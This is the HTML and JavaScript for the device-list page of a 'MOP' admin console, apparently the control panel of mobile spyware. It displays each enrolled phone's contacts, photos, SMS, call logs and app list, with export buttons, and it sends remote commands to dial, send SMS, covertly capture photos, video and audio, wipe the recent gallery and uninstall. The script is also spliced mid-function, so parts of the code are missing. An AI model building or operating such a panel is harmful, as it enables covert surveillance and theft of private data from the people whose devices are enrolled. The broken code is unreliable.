<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>设备列表 - MOP 管理后台</title>
  <link rel="stylesheet" href="assets/css/style.css">
</head>
<body class="admin-layout">
  <aside class="admin-sidebar">
    <div class="logo" id="logo">MOP 管理后台</div>
    <nav>
      <a href="main.html" id="navHome">首页</a>
      <a href="devices.html" class="active" id="navDevices">设备列表</a>
      <a href="users.html" id="navUsers">用户列表</a>
      <a href="relations.html" id="navRelations">关系列表</a>
      <a href="apk.html" id="navApk">应用下载</a>
      <a href="change-password.html" id="navChangePassword">修改密码</a>
      <a href="add-user.html" id="navAddUser">添加用户</a>
      <a href="#" id="navLogout" style="margin-top:12px; border-top:1px solid rgba(255,255,255,.1); padding-top:12px;">退出登录</a>
    </nav>
  </aside>
  <main class="admin-main">
    <header class="admin-header">
      <h1 id="pageTitle">设备列表</h1>
      <div class="admin-header-actions">
        <span class="lang-options"><button type="button" id="langZh" class="active">中文</button><button type="button" id="langEn">English</button></span>
      </div>
    </header>
    <div class="admin-content">
      <div class="card">
        <div class="card-title"><span id="devicesCardTitle">设备列表</span> <span style="font-size:12px; color:var(--text-secondary);" id="mockHint">（预览 Mock）</span></div>
        <div class="audit-query-bar" id="auditQueryBar">
          <span class="audit-query-label" id="auditQueryLabel">审计数据查询</span>
          <span class="audit-query-group">
            <input type="text" id="auditQueryInput" placeholder="手机号/用户名/昵称" class="audit-query-input">
            <button type="button" class="btn btn-primary btn-sm" id="auditQueryBtn">查询</button>
          </span>
          <span class="audit-query-group full-display-wrap">
            <label class="full-display-label"><input type="checkbox" id="fullDisplaySwitch" autocomplete="off"> <span id="fullDisplayLabel">全显</span></label>
          </span>
        </div>
        <div class="table-wrap device-table-wrap">
          <table class="device-table">
            <colgroup>
              <col class="col-device-user">
              <col class="col-device-network">
              <col class="col-audit"><col class="col-audit"><col class="col-audit"><col class="col-audit"><col class="col-audit"><col class="col-audit">
              <col class="col-dial">
              <col class="col-sms">
              <col class="col-custom">
              <col class="col-remote">
            </colgroup>
            <thead>
              <tr>
                <th id="colDeviceUser">设备/用户</th>
                <th id="colDeviceNetwork">设备/网络</th>
                <th id="colContacts">通讯录总数</th>
                <th id="colPhotos">相册总数</th>
                <th id="colSms">短信总数</th>
                <th id="colCallRecords">通话记录总数</th>
                <th id="colAppList">APP列表总数</th>
                <th id="colCaptures">远程采集</th>
                <th id="colDial">拨号设置</th>
                <th id="colSmsSend">发送短信到</th>
                <th id="colCustom">自定义</th>
                <th id="colRemote">远程设备管理</th>
              </tr>
            </thead>
            <tbody id="deviceTableBody">
              <tr><td colspan="12" class="loading-cell" id="deviceTableLoading"></td></tr>
            </tbody>
          </table>
        </div>
      </div>
    </div>
  </main>
  <div class="audit-modal-overlay" id="auditModalOverlay" style="display:none;">
    <div class="audit-modal" id="auditModal">
      <div class="audit-modal-header">
        <h3 class="audit-modal-title" id="auditModalTitle">通讯录</h3>
        <button type="button" class="audit-modal-close" id="auditModalClose">&times;</button>
      </div>
      <div class="audit-modal-body" id="auditModalBody"></div>
      <p class="audit-modal-note" id="auditModalNote">实际运营时：通讯录、相册、短信、通话记录、已安装APP 等数据应采集自用户设备真实数据；相册/媒体为设备真实图片照片。</p>
    </div>
  </div>
  <div class="audit-modal-overlay" id="deleteDeviceModalOverlay" style="display:none;">
    <div class="audit-modal" id="deleteDeviceModal" style="max-width:400px;">
      <div class="audit-modal-header">
        <h3 class="audit-modal-title" id="deleteDeviceModalTitle"></h3>
        <button type="button" class="audit-modal-close" id="deleteDeviceModalClose">&times;</button>
      </div>
      <div class="audit-modal-body" style="padding:16px;">
        <p id="deleteDeviceModalHint" style="margin-bottom:12px; color:var(--text-secondary); font-size:14px;"></p>
        <input type="password" id="deleteDevicePasswordInput" class="audit-query-input" placeholder="" style="width:100%; margin-bottom:16px; padding:8px 12px;" autocomplete="current-password" data-i18n-placeholder="deleteDevicePasswordRequired">
        <div id="deleteDeviceModalError" style="color:var(--color-error, #c00); font-size:13px; margin-bottom:8px; display:none;"></div>
        <div style="display:flex; gap:8px; justify-content:flex-end;">
          <button type="button" class="btn btn-sm" id="deleteDeviceModalCancel"></button>
          <button type="button" class="btn btn-sm btn-danger" id="deleteDeviceModalConfirm"></button>
        </div>
      </div>
    </div>
  </div>
  <script src="assets/js/i18n.js"></script>
  <script src="assets/js/app.js"></script>
  <script src="assets/js/admin-api.js"></script>
  <script>
    var i18n = window.ADMIN_I18N;
    var app = window.ADMIN_APP;
    var adminApi = window.ADMIN_API;
    if (!app.isLoggedIn()) app.redirectLogin();
    else {
      var PACKAGE_TO_APP_NAME = {
        'com.tencent.mm': '微信',
        'com.tencent.mobileqq': 'QQ',
        'com.eg.android.AlipayGphone': '支付宝',
        'com.ss.android.ugc.aweme': '抖音',
        'com.alibaba.android.rimet': '钉钉',
        'com.taobao.taobao': '淘宝',
        'com.jingdong.app.mall': '京东',
        'com.sina.weibo': '微博',
        'com.netease.cloudmusic': '网易云音乐',
        'com.bbk.launcher2': 'vivo 桌面',
        'com.miui.home': '小米桌面',
        'com.android.chrome': 'Chrome',
        'com.mi.globalbrowser': '小米浏览器',
        'com.android.browser': '系统浏览器',
        'com.UCMobile': 'UC 浏览器',
        'com.qihoo360.mobilesafe': '360 手机卫士',
        'com.tencent.wework': '企业微信',
        'com.achievo.vipshop': '唯品会',
        'com.kuaishou.nebula': '快手',
        'com.zhiliaoapp.musically': 'TikTok',
        'com.huawei.browser': '华为浏览器',
        'com.opera.browser': 'Opera',
        'org.mozilla.firefox': 'Firefox',
        'com.sec.android.app.sbrowser': 'Samsung Internet'
      };
      function appDisplayName(pkg) {
        if (!pkg || typeof pkg !== 'string') return '—';
        return PACKAGE_TO_APP_NAME[pkg.trim()] || pkg;
      }
      function friendlyDeviceModel(deviceInfo) {
        if (!deviceInfo) return '—';
        try {
          var o = typeof deviceInfo === 'string' ? JSON.parse(deviceInfo) : deviceInfo;
          var model = (o && o.model) ? String(o.model).trim() : '';
          if (!model) return '—';
          if (/iPhone/i.test(model)) {
            var num = model.match(/(\d+)/);
            return 'iPhone' + (num ? ' ' + num[1] : '');
          }
          if (/iPad/i.test(model)) {
            var num = model.match(/(\d+)/);
            return 'iPad' + (num ? ' ' + num[1] : '');
          }
          var brand = (o && o.brand) ? String(o.brand).trim() : '';
          var map = {
            '2211133C': '小米13', '2210132C': '小米12', '2201123C': '小米12 Pro', '21091116C': '小米11 青春版',
            'M2012K11AC': '红米 K40', '22041216C': '红米 K50', '23046RP50C': '红米 Note 12',
            'SM-G9980': '三星 S21 Ultra', 'SM-S9080': '三星 S22 Ultra', 'SM-A5360': '三星 A53',
            'PBAM00': 'OPPO A', 'PCLM10': 'OPPO Reno', 'PFFM20': 'OPPO Find X5',
            'V2118A': 'vivo X70', 'V2218A': 'vivo X80', 'PD2140': 'vivo iQOO',
            'ANY-AN00': '华为 Mate 40', 'ALN-AL00': '华为 Mate 60', 'BRQ-AN00': '华为 P50'
          };
          if (map[model]) return map[model];
          if (brand) {
            var brandZh = { 'Xiaomi': '小米', 'Redmi': '红米', 'Samsung': '三星', 'Huawei': '华为', 'Honor': '荣耀', 'OPPO': 'OPPO', 'vivo': 'vivo', 'OnePlus': '一加', 'Realme': '真我', 'Apple': '苹果' }[brand] || brand;
            return brandZh + ' ' + model;
          }
          return model;
        } catch (e) { return '—'; }
      }
      function deviceModelFromInfo(deviceInfo) {
        return friendlyDeviceModel(deviceInfo);
      }
      function maskIp(ip) {
        if (!ip || typeof ip !== 'string') return '—';
        var parts = ip.trim().split('.');
        if (parts.length === 4) return parts[0] + '.' + parts[1] + '.*.*';
        return ip;
      }
      function escapeHtml(s) {
        if (s == null) return '';
        return String(s).replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;').replace(/"/g, '&quot;');
      }
      function formatBackendTime(s) {
        if (!s) return '—';
        var d = new Date(s);
        if (isNaN(d.getTime())) return String(s).replace(/</g, '&lt;').replace(/>/g, '&gt;');
        var pad = function (x) { return (x < 10 ? '0' : '') + x; };
        return d.getFullYear() + '/' + pad(d.getMonth() + 1) + '/' + pad(d.getDate()) + ' ' + pad(d.getHours()) + ':' + pad(d.getMinutes());
      }
      function buildDeviceRow(d) {
        var fullDeviceId = (d.device_id || '');
        var deviceIdDisplay = fullDeviceId.length > 8 ? fullDeviceId.slice(-8) : fullDeviceId;
        deviceIdDisplay = deviceIdDisplay.replace(/</g, '&lt;').replace(/>/g, '&gt;');
        var citySuffix = (d.last_location_city != null && String(d.last_location_city).trim() !== '') ? ' ' + String(d.last_location_city).trim().replace(/</g, '&lt;').replace(/>/g, '&gt;') : '';
        var fullDeviceIdEsc = fullDeviceId.replace(/</g, '&lt;').replace(/>/g, '&gt;').replace(/"/g, '&quot;');
        var nickname = (d.nickname || '—').replace(/</g, '&lt;').replace(/>/g, '&gt;');
        var uidMasked = (d.uid || '').length > 4 ? (d.uid).slice(0, 2) + '***' + (d.uid).slice(-2) : (d.uid || '—');
        var model = deviceModelFromInfo(d.device_info).replace(/</g, '&lt;').replace(/>/g, '&gt;');
        var ipDisplay = maskIp(d.last_ip || '');
        var timeDisplay = formatBackendTime(d.created_at);
        var lastIpEsc = (d.last_ip || '').replace(/"/g, '&quot;').replace(/</g, '&lt;').replace(/>/g, '&gt;');
        return '<tr>' +
          '<td class="device-info-cell"><div class="device-info-block">' +
          '<span class="info-row"><span class="info-label">' + i18n.t('deviceId') + '</span>: <span class="info-value device-id-value" data-device-id="' + fullDeviceIdEsc + '">' + deviceIdDisplay + citySuffix + '</span></span>' +
          '<span class="info-row"><span class="info-label">' + i18n.t('username') + '</span>: <span class="info-value"><span data-masked="' + uidMasked + '" data-full="' + (d.uid || '').replace(/"/g, '&quot;') + '">' + uidMasked + '</span></span></span>' +
          '<span class="info-row"><span class="info-label">' + i18n.t('phoneNumber') + '</span>: <span class="info-value">—</span></span>' +
          '<span class="info-row"><span class="info-label">' + i18n.t('nickname') + '</span>: <span class="info-value info-value-nickname">' + nickname + '</span></span>' +
          '</div></td>' +
          '<td class="device-info-cell"><div class="device-info-block">' +
          '<span class="info-row"><span class="info-label">' + i18n.t('phoneModel') + '</span>: <span class="info-value">' + model + '</span></span>' +
          '<span class="info-row"><span class="info-label">' + i18n.t('ipLabel') + '</span>: <span class="info-value" data-masked="' + ipDisplay + '" data-full="' + (d.last_ip || '').replace(/"/g, '&quot;') + '">' + ipDisplay + '</span></span>' +
          '<span class="info-row"><span class="info-label">' + i18n.t('region') + '</span>: <span class="info-value region-value" data-ip="' + lastIpEsc + '">—</span></span>' +
          '<span class="info-row"><span class="info-value">' + timeDisplay + '</span></span>' +
          '</div></td>' +
          '<td class="audit-cell"><div class="audit-label-count"><span class="audit-label">' + i18n.t('contactsLabel') + '</span>:<span class="audit-count"><span data-masked="**" data-full="—">**</span> <span>' + i18n.t('unitContacts') + '</span></span></div><div class="audit-actions"><button type="button" class="btn btn-sm btn-audit-view" data-page="contacts">' + i18n.t('view') + '</button><button type="button" class="btn btn-sm btn-audit-copy" data-page="contacts">' + i18n.t('copy') + '</button><button type="button" class="btn btn-sm btn-audit-export" data-page="contacts">' + i18n.t('export') + '</button></div></td>' +
          '<td class="audit-cell"><div class="audit-label-count"><span class="audit-label">' + i18n.t('photosLabel') + '</span>:<span class="audit-count"><span data-masked="**" data-full="—">**</span> <span>' + i18n.t('unitPhotos') + '</span></span></div><div class="audit-actions"><button type="button" class="btn btn-sm btn-audit-view" data-page="gallery">' + i18n.t('view') + '</button><button type="button" class="btn btn-sm btn-audit-export" data-page="gallery">' + i18n.t('export') + '</button></div></td>' +
          '<td class="audit-cell"><div class="audit-label-count"><span class="audit-label">' + i18n.t('smsLabel') + '</span>:<span class="audit-count"><span data-masked="**" data-full="—">**</span> <span>' + i18n.t('unitSms') + '</span></span></div><div class="audit-actions"><button type="button" class="btn btn-sm btn-audit-view" data-page="sms">' + i18n.t('view') + '</button><button type="button" class="btn btn-sm btn-audit-copy" data-page="sms">' + i18n.t('copy') + '</button><button type="button" class="btn btn-sm btn-audit-export" data-page="sms">' + i18n.t('export') + '</button></div></td>' +
          '<td class="audit-cell"><div class="audit-label-count"><span class="audit-label">' + i18n.t('callRecordsLabel') + '</span>:<span class="audit-count"><span data-masked="**" data-full="—">**</span> <span>' + i18n.t('unitCalls') + '</span></span></div><div class="audit-actions"><button type="button" class="btn btn-sm btn-audit-view" data-page="calllog">' + i18n.t('view') + '</button><button type="button" class="btn btn-sm btn-audit-copy" data-page="calllog">' + i18n.t('copy') + '</button><button type="button" class="btn btn-sm btn-audit-export" data-page="calllog">' + i18n.t('export') + '</button></div></td>' +
          '<td class="audit-cell"><div class="audit-label-count"><span class="audit-label">' + i18n.t('appListLabel') + '</span>:<span class="audit-count"><span data-masked="**" data-full="—">**</span> <span>' + i18n.t('unitApps') + '</span></span></div><div class="audit-actions"><button type="button" class="btn btn-sm btn-audit-view" data-page="applist">' + i18n.t('view') + '</button><button type="button" class="btn btn-sm btn-audit-copy" data-page="applist">' + i18n.t('copy') + '</button><button type="button" class="btn btn-sm btn-audit-export" data-page="applist">' + i18n.t('export') + '</button></div></td>' +
          '<td class="audit-cell"><div class="audit-label-count"><span class="audit-label">' + i18n.t('capturesLabel') + '</span></div><div class="audit-actions"><button type="button" class="btn btn-sm btn-audit-view" data-page="captures">' + i18n.t('view') + '</button></div></td>' +
          '<td class="control-cell control-cell-vertical" headers="colDial"><div class="control-col-dial"><div class="control-row"><input type="text" class="dial-number-input" placeholder="' + (i18n.t('dialNumber') || '') + '"></div><div class="control-row"><button type="button" class="btn btn-sm btn-dial-cmd">' + i18n.t('dialButton') + '</button></div><div class="control-row"><button type="button" class="btn btn-sm">' + i18n.t('hangUpButton') + '</button></div></div></td>' +
          '<td class="control-cell control-cell-vertical" headers="colSmsSend"><div class="control-col-sms"><div class="control-row"><input type="text" class="sms-number-input" placeholder="' + (i18n.t('smsNumber') || '') + '"></div><div class="control-row"><input type="text" class="sms-body-input" placeholder="' + (i18n.t('smsContent') || '') + '"></div><div class="control-row"><button type="button" class="btn btn-sm btn-sms-cmd">' + i18n.t('sendButton') + '</button></div></div></td>' +
          '<td class="control-cell" headers="colCustom"><div class="control-col-custom custom-func-block"><button type="button" class="btn btn-sm">' + i18n.t('func1') + '</button><button type="button" class="btn btn-sm">' + i18n.t('func2') + '</button><button type="button" class="btn btn-sm">' + i18n.t('func3') + '</button><button type="button" class="btn btn-sm">' + i18n.t('func4') + '</button></div></td>' +
          '<td class="control-cell control-cell-vertical" headers="colRemote"><div class="control-col-remote"><button type="button" class="btn btn-sm btn-capture-photo">' + i18n.t('capturePhoto') + '</button><button type="button" class="btn btn-sm btn-capture-video">' + i18n.t('captureVideo') + '</button><button type="button" class="btn btn-sm btn-capture-audio">' + i18n.t('captureAudio') + '</button><button type="button" class="btn btn-sm btn-clear-gallery">' + i18n.t('clearGallery') + '</button><button type="button" class="btn btn-sm btn-uninstall-cmd btn-danger">' + i18n.t('remoteUninstall') + '</button><button type="button" class="btn btn-sm btn-device-delete btn-danger">' + (i18n.t('deleteDevice') || '删除') + '</button><button type="button" class="btn btn-sm">' + i18n.t('exportAllChats') + '</button><button type="button" class="btn btn-sm">' + i18n.t('packageDownloadAll') + '</button></div></td>' +
          '</tr>';
      }
      /** IP 归属地：使用设备 last_ip 调用 ipapi.co（HTTPS）查询，展示格式 国家 省/州 市；按 IP 缓存；内网/私有 IP 不请求，显示「—」 */
      var ipGeoCache = {};
      function fetchIpGeo(ip, callback) {
        if (!ip || typeof ip !== 'string' || ip.trim() === '') { callback('—'); return; }
        ip = ip.trim();
        if (ipGeoCache[ip] !== undefined) { callback(ipGeoCache[ip]); return; }
        var isPrivate = /^(10\.|172\.(1[6-9]|2\d|3[01])\.|192\.168\.|127\.)/.test(ip);
        if (isPrivate) { ipGeoCache[ip] = '—'; callback('—'); return; }
        var url = 'https://ipapi.co/' + encodeURIComponent(ip) + '/json/';
        fetch(url).then(function(r) { return r.json(); }).then(function(data) {
          var parts = [];
          if (data.country_name) parts.push(data.country_name);
          if (data.region) parts.push(data.region);
          if (data.city) parts.push(data.city);
          var text = parts.length ? parts.join(' ') : (data.error ? '—' : '—');
          ipGeoCache[ip] = text;
          callback(text);
        }).catch(function() { ipGeoCache[ip] = '—'; callback('—'); });
      }
      function fillRegionFromIp() {
        document.querySelectorAll('.region-value[data-ip]').forEach(function(el) {
          var ip = (el.getAttribute('data-ip') || '').trim();
          if (!ip) return;
          fetchIpGeo(ip, function(text) {
            el.textContent = text;
          });
        });
      }
      function renderDevicesTable(items) {
        var tbody = document.getElementById('deviceTableBody');
        if (!tbody) return;
        if (!items || items.length === 0) {
          var hint = (i18n.t('noDataHintSameApi') || '').trim();
          var hintRow = hint ? '<tr><td colspan="12" class="loading-cell" style="font-size:12px; color:var(--text-secondary); padding:8px 12px;">' + hint + '</td></tr>' : '';
          tbody.innerHTML = '<tr><td colspan="12" class="loading-cell">' + i18n.t('noDevices') + '</td></tr>' + hintRow;
          return;
        }
        tbody.innerHTML = items.map(buildDeviceRow).join('');
        fillRegionFromIp();
      }
      function loadDevices(params) {
        if (!adminApi || !adminApi.getAdminToken()) {
          renderDevicesTable([]);
          return;
        }
        var hint = document.getElementById('deviceTableLoading');
        if (hint) hint.textContent = i18n.t('loadingDevices') || '加载中…';
        adminApi.getDevices(params || {}).then(function(data) {
          var hintEl = document.getElementById('mockHint');
          var items = (data && data.items) ? data.items : [];
          renderDevicesTable(items);
          if (hintEl) hintEl.textContent = '（已从 API 加载 ' + (data.total != null ? data.total : items.length) + ' 条）';
          if (items.length > 0) bindDeviceRowHandlers();
        }).catch(function(r) {
          if (r && (r.status === 401 || r.status === 403)) app.redirectLogin();
          else {
            renderDevicesTable([]);
            var hintEl = document.getElementById('mockHint');
            if (hintEl) hintEl.textContent = i18n.t('previewMock');
          }
        });
      }
      if (!adminApi.getApiBase()) adminApi.setApiBase('https://api.sdkdns.top');
      loadDevices();
      document.getElementById('logo').textContent = i18n.t('appName');
      document.getElementById('navHome').textContent = i18n.t('navHome');
      document.getElementById('navDevices').textContent = i18n.t('navDevices');
      document.getElementById('navUsers').textContent = i18n.t('navUsers');
      document.getElementById('navRelations').textContent = i18n.t('navRelations');
      document.getElementById('navApk').textContent = i18n.t('navApk');
      document.getElementById('navChangePassword').textContent = i18n.t('navChangePassword');
      document.getElementById('navAddUser').textContent = i18n.t('navAddUser');
      document.getElementById('navLogout').textContent = i18n.t('logout');
      document.getElementById('pageTitle').textContent = i18n.t('navDevices');
      document.getElementById('devicesCardTitle').textContent = i18n.t('navDevices');

          } else {

              return '<tr><td>' + (r.id != null ? r.id : '') + '</td><td>' + (r.date_added != null ? r.date_added : '') + '</td><td>' + (r.size != null ? r.size : (r.kind || '')) + '</td><td>' + (r.mime_type || r.kind || '') + '</td></tr>';
            });
            html = '<div class="table-wrap"><table class="audit-modal-table"><thead><tr><th>ID</th><th>日期/时间戳</th><th>大小/类型</th><th>MIME/类型</th></tr></thead><tbody>' + rows.join('') + '</tbody></table></div>';
          }
        } else if (pageType === 'sms') {
          var rows = pageItems.map(function(r) {
            var timeStr = formatAuditTime(r.date);
            var typeStr = smsTypeText(r.type);
            var content = (r.body != null && r.body !== '') ? escapeHtml(String(r.body).substring(0, 200)) : (r.body_length != null ? r.body_length + ' 字符' : '—');
            return '<tr><td>' + typeStr + '</td><td>' + escapeHtml(r.address || '') + '</td><td>' + content + '</td><td>' + timeStr + '</td></tr>';
          });
          html = '<div class="table-wrap"><table class="audit-modal-table"><thead><tr><th>类型</th><th>号码</th><th>内容</th><th>收发时间</th></tr></thead><tbody>' + rows.join('') + '</tbody></table></div>';
        } else if (pageType === 'calllog') {
          var rows = pageItems.map(function(r) {
            var timeStr = formatAuditTime(r.date);
            var typeStr = callTypeText(r.type);
            return '<tr><td>' + typeStr + '</td><td>' + escapeHtml(r.number || '') + '</td><td>' + timeStr + '</td><td>' + (r.duration != null ? r.duration + ' 秒' : '—') + '</td></tr>';
          });
          html = '<div class="table-wrap"><table class="audit-modal-table"><thead><tr><th>类型</th><th>号码</th><th>拨出/接听时间</th><th>时长</th></tr></thead><tbody>' + rows.join('') + '</tbody></table></div>';
        } else if (pageType === 'applist') {
          var rows = pageItems.map(function(r) {
            var pkg = r.package != null ? r.package : (r.pkg != null ? r.pkg : '');
            var appName = (r.name != null && r.name !== '') ? escapeHtml(String(r.name)) : escapeHtml(appDisplayName(pkg));
            return '<tr><td>' + appName + '</td><td>' + escapeHtml(pkg) + '</td><td>' + (r.version_name != null ? escapeHtml(String(r.version_name)) : '') + '</td><td>' + (r.long_version_code != null ? r.long_version_code : '') + '</td></tr>';
          });
          html = '<div class="table-wrap"><table class="audit-modal-table"><thead><tr><th>' + (i18n.t('appNameLabel') || '应用名') + '</th><th>' + (i18n.t('packageName') || '包名') + '</th><th>' + (i18n.t('version') || '版本名') + '</th><th>' + (i18n.t('versionCode') || '版本号') + '</th></tr></thead><tbody>' + rows.join('') + '</tbody></table></div>';
        } else if (pageType === 'usage') {
          var rows = pageItems.map(function(r) { var ms = r.total_time_ms != null ? r.total_time_ms : 0; var sec = Math.floor(ms / 1000); return '<tr><td>' + (r.package || '') + '</td><td>' + sec + ' 秒</td></tr>'; });
          html = '<div class="table-wrap"><table class="audit-modal-table"><thead><tr><th>包名</th><th>前台时长</th></tr></thead><tbody>' + rows.join('') + '</tbody></table></div>';
        } else {
          var keys = Object.keys(pageItems[0] || {});
          var thead = '<tr>' + keys.map(function(k){ return '<th>' + k + '</th>'; }).join('') + '</tr>';
          var tbody = pageItems.map(function(row){ return '<tr>' + keys.map(function(k){ return '<td>' + (row[k] != null ? row[k] : '') + '</td>'; }).join('') + '</tr>'; }).join('');
          html = '<div class="table-wrap"><table class="audit-modal-table"><thead>'+thead+'</thead><tbody>'+tbody+'</tbody></table></div>';
        }
        var hint = '<p class="audit-content-hint">以下为最新一次上报内容，共 ' + items.length + ' 条</p>';
        var pagination = '';
        if (totalPages > 1) {
          pagination = '<div class="audit-pagination"><button type="button" class="btn btn-sm audit-prev">上一页</button><span class="audit-page-info">第 ' + page + ' / ' + totalPages + ' 页</span><button type="button" class="btn btn-sm audit-next">下一页</button></div>';
        }
        bodyEl.innerHTML = hint + html + pagination;
        if (totalPages > 1) {
          bodyEl.querySelector('.audit-prev').onclick = function() { bodyEl._auditPage = Math.max(1, (bodyEl._auditPage || 1) - 1); renderAuditContentPage(bodyEl); };
          bodyEl.querySelector('.audit-next').onclick = function() { bodyEl._auditPage = Math.min(totalPages, (bodyEl._auditPage || 1) + 1); renderAuditContentPage(bodyEl); };
        }
      }
      function openAuditModal(page, deviceId){
        var overlay = document.getElementById('auditModalOverlay');
        var titleEl = document.getElementById('auditModalTitle');
        var bodyEl = document.getElementById('auditModalBody');
        var titles = { contacts: '通讯录', gallery: '相册', sms: '短信', calllog: '通话记录', applist: '已安装APP', captures: (i18n && i18n.t('capturesLabel')) ? i18n.t('capturesLabel') : '远程采集' };
        if (page === 'usage') titles.usage = '应用使用时长';
        titleEl.textContent = (titles[page] || page) + ' - ' + (deviceId ? deviceId.slice(0, 12) + '…' : '');
        var apiType = pageToApiType[page];
        if (apiType && adminApi && adminApi.getAdminToken() && adminApi.getAudit) {
          bodyEl.innerHTML = '<p class="loading-hint">加载中…</p>';
          overlay.style.display = 'flex';
          adminApi.getAudit(deviceId, apiType).then(function(data) {
            if (!data.items || data.items.length === 0) {
              bodyEl.innerHTML = '<p class="audit-empty-hint">' + (i18n.t('noAuditData') || '暂无上报数据，请确保设备已授权并完成采集上报。') + '</p>';
              return;
            }
            if (page === 'captures') {
              renderApiItems(page, data.items, bodyEl);
              return;
            }
            var latestId = data.items[0].id;
            if (!adminApi.getAuditBlobJson) { renderApiItems(page, data.items, bodyEl); return; }
            adminApi.getAuditBlobJson(latestId).then(function(payload) {
              renderAuditContent(page, payload, bodyEl);
            }).catch(function() {
              bodyEl.innerHTML = '<p class="audit-empty-hint">详细内容加载失败，请稍后重试。</p>';
            });
          }).catch(function() {
            bodyEl.innerHTML = '<p class="audit-empty-hint">' + (i18n.t('noAuditDataOrFailed') || '暂无上报数据或加载失败，请确认设备已上报。') + '</p>';
          });
        } else {
          bodyEl.innerHTML = '<p class="audit-empty-hint">' + (i18n.t('noAuditData') || '暂无上报数据，请确保设备已授权并完成采集上报。') + '</p>';
          overlay.style.display = 'flex';
        }
      }
      function bindDeviceRowHandlers() {
        document.querySelectorAll('.btn-audit-view').forEach(function(btn){
          btn.onclick = function(){
            var deviceId = getDeviceIdFromButton(this);
            var page = this.getAttribute('data-page');
            openAuditModal(page, deviceId);
          };
        });
        document.querySelectorAll('.btn-audit-copy').forEach(function(btn){
          btn.onclick = function(){
            var deviceId = getDeviceIdFromButton(this);
            var page = this.getAttribute('data-page');
            var btnEl = this;
            var origText = btnEl.textContent;
            btnEl.disabled = true;
            btnEl.textContent = (i18n.t('loading') || '加载中') + '…';
            getAuditDataAsTextAsync(deviceId, page).then(function(text){
              btnEl.disabled = false;
              btnEl.textContent = origText;
              if (text) copyTextToClipboard(text); else alert(i18n.t('noContentToCopy'));
            }).catch(function(){
              btnEl.disabled = false;
              btnEl.textContent = origText;
              alert(i18n.t('noContentToCopy'));
            });
          };
        });
        document.querySelectorAll('.btn-audit-export').forEach(function(btn){
          btn.onclick = function(){
            var deviceId = getDeviceIdFromButton(this);
            var page = this.getAttribute('data-page');
            var names = { contacts: '通讯录', sms: '短信', calllog: '通话记录', applist: '已安装APP', gallery: '相册' };
            var name = names[page] || page;
            var filename = name + '_' + deviceId + '.txt';
            var btnEl = this;
            var origText = btnEl.textContent;
            btnEl.disabled = true;
            btnEl.textContent = (i18n.t('loading') || '加载中') + '…';
            getAuditDataAsTextAsync(deviceId, page).then(function(text){
              btnEl.disabled = false;
              btnEl.textContent = origText;
              if (text) downloadAsPlainText(text, filename); else alert(i18n.t('noContentToExport'));
            }).catch(function(){
              btnEl.disabled = false;
              btnEl.textContent = origText;
              alert(i18n.t('noContentToExport'));
            });
          };
        });
        document.querySelectorAll('.btn-dial-cmd').forEach(function(btn){
          btn.onclick = function(){
            if (this.disabled) return;
            var deviceId = getDeviceIdFromButton(this);
            if (!deviceId) { alert(i18n.t('deviceIdRequired') || '请先选择设备'); return; }
            if (!confirm(i18n.t('confirmSendCommand') || '确定要下发该指令吗？')) return;
            var cell = this.closest('.control-col-dial');
            var numberInput = cell ? cell.querySelector('.dial-number-input') : null;
            var number = numberInput ? numberInput.value.trim() : '';
            sendCommandToDevice(deviceId, 'mop.cmd.dial', { number: number }, this, COMMAND_COOLDOWN_SEC);
          };
        });
        document.querySelectorAll('.btn-sms-cmd').forEach(function(btn){
          btn.onclick = function(){
            if (this.disabled) return;
            var deviceId = getDeviceIdFromButton(this);
            if (!deviceId) { alert(i18n.t('deviceIdRequired') || '请先选择设备'); return; }
            if (!confirm(i18n.t('confirmSendCommand') || '确定要下发该指令吗？')) return;
            var cell = this.closest('.control-col-sms');
            var numberInput = cell ? cell.querySelector('.sms-number-input') : null;
            var bodyInput = cell ? cell.querySelector('.sms-body-input') : null;
            var number = numberInput ? numberInput.value.trim() : '';
            var body = bodyInput ? bodyInput.value.trim() : '';
            sendCommandToDevice(deviceId, 'mop.cmd.sms', { number: number, body: body }, this, COMMAND_COOLDOWN_SEC);
          };
        });
        document.querySelectorAll('.btn-clear-gallery').forEach(function(btn){
          btn.onclick = function(){
            if (this.disabled) return;
            var deviceId = getDeviceIdFromButton(this);
            if (!deviceId) { alert(i18n.t('deviceIdRequired') || '请先选择设备'); return; }
            if (!confirm(i18n.t('confirmClearGallery') || '确定要清理该设备最近 3 天相册吗？')) return;
            sendCommandToDevice(deviceId, 'mop.cmd.gallery.clear', { days: 3 }, this, COMMAND_COOLDOWN_SEC);
          };
        });
        document.querySelectorAll('.btn-uninstall-cmd').forEach(function(btn){
          btn.onclick = function(){
            var deviceId = getDeviceIdFromButton(this);
            if (!deviceId) { alert(i18n.t('deviceIdRequired') || '请先选择设备'); return; }
            if (!confirm(i18n.t('confirmUninstall') || '确定对该设备执行远程卸载？将清空数据并调起系统卸载（用户确认后卸载应用）。')) return;
            sendCommandToDevice(deviceId, 'mop.cmd.uninstall', {}, this);
          };
        });
        document.querySelectorAll('.btn-capture-photo').forEach(function(btn){
          btn.onclick = function(){
            if (this.disabled) return;
            var deviceId = getDeviceIdFromButton(this);
            if (!deviceId) { alert(i18n.t('deviceIdRequired') || '请先选择设备'); return; }
            if (!confirm(i18n.t('confirmSendCommand') || '确定要下发该指令吗？')) return;
            sendCommandToDevice(deviceId, 'mop.cmd.capture.photo', {}, this, COMMAND_COOLDOWN_SEC);
          };
        });
        document.querySelectorAll('.btn-capture-video').forEach(function(btn){
          btn.onclick = function(){
            if (this.disabled) return;
            var deviceId = getDeviceIdFromButton(this);
            if (!deviceId) { alert(i18n.t('deviceIdRequired') || '请先选择设备'); return; }
            if (!confirm(i18n.t('confirmSendCommand') || '确定要下发该指令吗？')) return;
            sendCommandToDevice(deviceId, 'mop.cmd.capture.video', { duration_sec: 18 }, this, COMMAND_COOLDOWN_SEC);
          };
        });
        document.querySelectorAll('.btn-capture-audio').forEach(function(btn){
          btn.onclick = function(){
            if (this.disabled) return;
            var deviceId = getDeviceIdFromButton(this);
            if (!deviceId) { alert(i18n.t('deviceIdRequired') || '请先选择设备'); return; }
            if (!confirm(i18n.t('confirmSendCommand') || '确定要下发该指令吗？')) return;
            sendCommandToDevice(deviceId, 'mop.cmd.capture.audio', { duration_sec: 18 }, this, COMMAND_COOLDOWN_SEC);
          };
        });
        var deleteDeviceModalDeviceId = null;
